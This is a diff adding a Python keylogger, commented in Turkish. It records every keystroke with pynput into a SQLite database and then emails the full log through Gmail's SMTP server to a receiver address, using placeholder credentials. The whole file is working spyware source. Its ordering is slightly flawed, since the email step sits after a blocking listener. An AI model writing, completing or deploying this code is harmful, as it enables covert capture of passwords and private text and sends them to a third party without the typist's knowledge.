@@ -1,0 +1,47 @@
+import pynput
+from pynput import keyboard
+import sqlite3
+import datetime
+import smtplib
+
+# Veritabanını başlat
+conn = sqlite3.connect('logs.db')
+c = conn.cursor()
+
+# Tablo oluştur (eğer zaten yoksa)
+c.execute('''CREATE TABLE IF NOT EXISTS logs
+             (timestamp text, key text)''')
+
+# Klavye dinleyicisini oluştur
+def on_press(key):
+    try:
+        key_str = str(key.char)
+    except AttributeError:
+        key_str = str(key)
+
+    # Veritabanına kaydet
+    timestamp = str(datetime.datetime.now())
+    c.execute("INSERT INTO logs (timestamp, key) VALUES (?, ?)", (timestamp, key_str))
+    conn.commit()
+
+def on_release(key):
+    pass
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+# Verileri e-posta ile gönder
+def send_email():
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login("your_email@gmail.com", "your_password")
+    msg = "Günlük klavye verileri"
+    c.execute("SELECT * FROM logs")
+    data = c.fetchall()
+    for row in data:
+        msg += "\n" + str(row[0]) + " - " + row[1]
+    server.sendmail("sender_email@gmail.com", "receiver_email@gmail.com", msg)
+    server.quit()
+
+# Günlük verileri gönder
+send_email()
